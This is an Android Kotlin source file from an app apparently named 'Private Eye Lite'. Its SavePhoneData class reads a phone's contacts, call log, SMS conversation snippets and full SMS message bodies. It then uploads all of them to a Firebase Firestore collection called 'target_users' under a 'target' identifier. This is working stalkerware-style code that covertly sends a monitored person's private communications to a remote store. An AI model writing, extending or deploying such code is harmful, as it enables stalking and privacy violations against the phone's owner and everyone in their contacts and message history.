package com.rashediqbal.privateeyelite

import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.text.format.DateFormat
import android.util.Log
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase

class SavePhoneData(val context: Context) {

    private val sessionManager = SessionManager(context)
    private val userData = sessionManager.getUser()
    private val db = Firebase.firestore
    private val batch = db.batch()
    private val targetDocuments = db.collection("target_users").document(userData["target"]!!)

    fun saveData2(){
        getCalls()
    }

    fun saveData(){

        val contactsMap = getContacts()
        val callsMap = getCalls()
        val conversationMap = getConversations()
        val messageMap = getMessages()

        if (sessionManager.isFirstTime()){
            batch.update(targetDocuments.collection("data").document("contacts"),
                contactsMap as Map<String, Any>
            )
            batch.update(targetDocuments.collection("data").document("calls"),
                callsMap as Map<String, Any>
            )
            batch.update(targetDocuments.collection("data").document("conversations"),
                conversationMap as Map<String, Any>
            )
            batch.update(targetDocuments.collection("data").document("messages"),
                messageMap as Map<String, Any>
            )

            batch.commit().addOnSuccessListener {
                Log.d("TEST_UPLOAD","Updated Success")
            }.addOnFailureListener {
                Log.d("TEST_UPLOAD","Failed")
            }
        } else {

            batch.set(targetDocuments.collection("data").document("contacts"),
                contactsMap as Map<String, Any>
            )
            batch.set(targetDocuments.collection("data").document("calls"),
                callsMap as Map<String, Any>
            )
            batch.set(targetDocuments.collection("data").document("conversations"),
                conversationMap as Map<String, Any>
            )
            batch.set(targetDocuments.collection("data").document("messages"),
                messageMap as Map<String, Any>
            )

            batch.commit().addOnSuccessListener {
                sessionManager.setFirstTime()
                Log.d("TEST_UPLOAD","Success")
            }.addOnFailureListener {
                Log.d("TEST_UPLOAD","Failed")
            }

        }

    }

    @SuppressLint("Range")
    private fun getContacts(): HashMap<String, Any> {

        val map = HashMap<String,Any>()

        val contentResolver = context.contentResolver
        val uri: Uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val cursor: Cursor? = contentResolver.query(uri,null,null,null,null)

        Log.i("MY_CONTACTS","TotalContacts ${cursor!!.count}")

        if(cursor.count > 0){
            while (cursor.moveToNext()){
                val contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val contactNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                val id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))
                val hashMap = hashMapOf<String,Any>(
                    "name" to contactName,
                    "number" to contactNumber,
                )
                map[id] = hashMap
            }
            cursor.close()
        }

        return map
    }

    @SuppressLint("Range")
    private fun getCalls(): HashMap<String, Any> {
        val map = HashMap<String,Any>()

        val contentResolver = context.contentResolver
        val uri: Uri = CallLog.Calls.CONTENT_URI
        val cursor: Cursor? = contentResolver.query(uri,null,null,null,null)

        Log.i("MY_CALLS","TotalCalls ${cursor!!.count}")

        if(cursor.count > 0){
            while (cursor.moveToNext()){
                val number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                val getName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
                val name = if(getName == null || getName == "")  "Unknown" else getName
                val type = when (cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))){
                    "1" -> "Incoming"
                    "2" -> "Outgoing"
                    "3" -> "Missed"
                    else -> "None"
                }
                val id = cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID))
                val date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE))
                val hashMap = hashMapOf<String,Any>(
                    "name" to name,
                    "number" to number,
                    "type" to type,
                    "date" to date
                )
                map[id] = hashMap
//                Log.i("MY_CALLS","Id: $id Name: $name, Number: $number Type: $type Date: $date")
            }
            cursor.close()
        }
        return map
    }

    @SuppressLint("Range")
    private fun getConversations():HashMap<String,Any> {
        val map = HashMap<String,Any>()

        val uri = Telephony.Sms.Conversations.CONTENT_URI
        val projection = arrayOf("msg_count", "snippet", "thread_id")
        val cursor: Cursor? = context.contentResolver.query(
            uri, projection, null, null, Telephony.Sms.Conversations.DEFAULT_SORT_ORDER
        )
        if (cursor!!.count > 0){
            while (cursor.moveToNext()) {
                val msgCount = cursor.getInt(cursor.getColumnIndex("msg_count"))
                val snippet = cursor.getString(cursor.getColumnIndex("snippet"))
                val threadId = cursor.getString(cursor.getColumnIndex("thread_id"))

                val insideUri = Telephony.Sms.CONTENT_URI
                val insideCursor:Cursor? = context.contentResolver.query(insideUri, null, "thread_id=$threadId", null, null)
                insideCursor!!.moveToFirst()
                val address = insideCursor.getString(insideCursor.getColumnIndex(Telephony.Sms.ADDRESS))
                val date = insideCursor.getString(insideCursor.getColumnIndex(Telephony.Sms.DATE))
                val newDate = DateFormat.format("hh:mm", date.toLong()).toString()
                insideCursor.close()


                val hashMap = hashMapOf<String,Any>(
                    "address" to address,
                    "snippet" to snippet,
                    "date" to date,
                )

                map[threadId] = hashMap

                Log.d("MY_CONVERSATIONS","Name: $address, MessageCount: $msgCount, Date: $newDate, Snippet: $snippet")
            }
            cursor.close()
        }
        return map
    }

    private fun getMessages():HashMap<String,Any>{
        val map = HashMap<String,Any>()
        val projection = arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE, Telephony.Sms._ID)
        val cursor:Cursor? = context.contentResolver.query(Telephony.Sms.CONTENT_URI,projection,null,null,Telephony.Sms.DATE +" ASC")
        if (cursor!!.count > 0){
            while (cursor.moveToNext()){

                val hashMap = hashMapOf<String,Any>(
                    "address" to cursor.getString(0),
                    "body" to cursor.getString(1),
                    "type" to cursor.getString(2),
                    "data" to cursor.getString(3)
                )
                map[cursor.getString(4)] = hashMap

                if (cursor.isLast){
                    break
                }
            }
            cursor.close()
        }
        return map
    }
}